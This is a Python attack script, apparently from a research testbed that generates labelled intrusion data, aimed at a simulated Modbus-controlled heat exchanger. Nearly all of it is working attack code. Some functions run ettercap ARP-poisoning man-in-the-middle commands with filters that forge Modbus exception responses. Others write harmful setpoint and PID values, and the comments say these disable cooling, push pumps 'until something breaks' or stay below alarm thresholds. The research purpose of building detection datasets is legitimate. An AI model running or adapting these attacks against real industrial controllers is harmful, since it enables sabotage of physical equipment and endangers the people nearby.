#!/bin/python3

"""
Created on Tue Mar 10 15:43:48 2020

@author: Rishabh Das


Please include change_data_label(label) function call before doing each attack
This function call lets the data logger know that some kind of attack is
being performed on the system.

"""
import socket
import pickle
from threading import Thread
from HeatExchangerModbusUtility import ModbusUtility
from HeatExchangerAttackUtility import AttackTask
import os

MODBUS_PKT_SIZE=55
PKT_PER_SEC = 1000

class attack:
    def __init__(self, ip, port):
        self.he = ModbusUtility( ip )
        self.CurrentAttack = None
        self.ThreadDict = {}

        self.AttackDict = {
	     8: self.Attack8,
             9: self.Attack9,
            10: self.Attack10,
            11: self.Attack11,
            12: self.Attack12,
            18: self.Attack18,
            19: self.Attack19,
            20: self.Attack20,
            21: self.Attack21,
            22: self.Attack22,
            23: self.Attack23,
            24: self.Attack24,
            25: self.Attack25,
            26: self.Attack26,
        }

    def RunAttack( self, AttackNumber, pkt_per_sec=PKT_PER_SEC ):
        # Set label to attack label

        # Create attack task
        tsk = AttackTask( self.AttackDict[ AttackNumber ], pkt_per_sec )

        # Create attack task thread
        t = Thread(target = tsk.run )

        # Stop thread and remove it from thread dict if already present / running
        if( AttackNumber in self.ThreadDict.keys() ):
            self.ThreadDict[AttackNumber]["task"].terminate()
            self.ThreadDict[AttackNumber]["thread"].join()
            del self.ThreadDict[AttackNumber]

        # Insert into thread dict
        self.ThreadDict[AttackNumber] = {"thread": t, "task": tsk}

        # Start thread (This may not work as I am unsure how adding it to
        # dictionary first and then running it will effect future operations.)
        t.start()

    def StopAttack( self, AttackNumber ):
        if( AttackNumber in self.ThreadDict.keys() ):
            self.ThreadDict[AttackNumber]["task"].terminate()
            self.ThreadDict[AttackNumber]["thread"].join()
            del self.ThreadDict[AttackNumber]

    def StopAllAttacks( self ):
        # Changing to list is necessary since the dictionary keys object will change
        # size after deleting elements. For loop no likey and thows errors
        for AttackNumber in list( self.ThreadDict.keys() ):
            self.StopAttack( AttackNumber )

    def Attack8( self ):
        # #8 -- Replace function code with 0x80 and add 0x01 exception code after
        os.system("ettercap -TQ -s 's(5)q' -F attack8EC1.ef -M ARP /192.168.56.1// /192.168.56.105//")

    def Attack9( self ):
        # #9 -- Replace function code with 0x80 and add 0x02 exception code after
        os.system("ettercap -TQ -s 's(5)q' -F attack9EC2.ef -M ARP /192.168.56.1// /192.168.56.105//")

    def Attack10( self ):
        # #10 -- Replace function code with 0x80 and add 0x03 exception code after
        os.system("ettercap -TQ -s 's(5)q' -F attack10EC3.ef -M ARP /192.168.56.1// /192.168.56.105//")

    def Attack11( self ):
        # #11 -- Replace function code with 0x80 and add 0x04 exception code after
        os.system("ettercap -TQ -s 's(5)q' -F attack11EC4.ef -M ARP /192.168.56.1// /192.168.56.105//")

    def Attack12( self ):
        # #12 -- Replace function code with 0x80 and add 0x05 exception code after
        os.system("ettercap -TQ -s 's(5)q' -F attack12EC5.ef -M ARP /192.168.56.1// /192.168.56.105//")

    def Attack18( self ):
        # #18 -- Set the value of setpoint below 20C
        self.he.WriteRegister( "Setpoint", 10 )

    def Attack19( self ):
        # #19 -- Set the value of setpoint above 70C
        self.he.WriteRegister( "Setpoint", 80 )

    def Attack20( self ):
        # #20 -- Set the value of setpoint to 26C (acceptable value but will force a significantly higher workload)
        self.he.WriteRegister( "Setpoint", 26 )

    def Attack21( self ):
        # #21 -- Set the value of setpoint to zero (this disables all flow resulting in no cooling)
        self.he.WriteRegister( "Setpoint", 0 )

    def Attack22( self ):
        # #21 -- Set the value of pid_kp to 0.9 (rapid change in required flow rate while still remaining mostly-stable to avoid triggering alarms)
        self.he.WriteRegister( "PID_kp", 0.9 )

    def Attack23( self ):
        # #23 -- Set the value of pid_kp to 1.2 (unstable system forcing rapid change in flow rate, potentially overtaxing pumps until something breaks)
        self.he.WriteRegister( "PID_kp", 1.2 )

    def Attack24( self ):
        # #24 -- Set the value of pid_tr to 0 (forces max flow rate and produces lowest possible output temp all the time) 
        self.he.WriteRegister( "PID_tr", 0 )

    def Attack25( self ):
        # #25 -- Set the value of pid_tr to -0.1 (disables flow rate resulting in no change in temperature)
        self.he.WriteRegister( "PID_tr", -0.1 )

    def Attack26( self ):
        # #26 -- Set the value of pid_td to 0.5 (does nothing if system is already stable.  Will cause instability when set point is moved afterwards)
        self.he.WriteRegister( "PID_td", 0.5 )

if __name__=="__main__":
    attacker = attack( "192.168.56.104", "502" )
    attacker.he.PrintAllRegisters()
    attacker.RunAttack( 12 )
    attacker.StopAllAttacks()
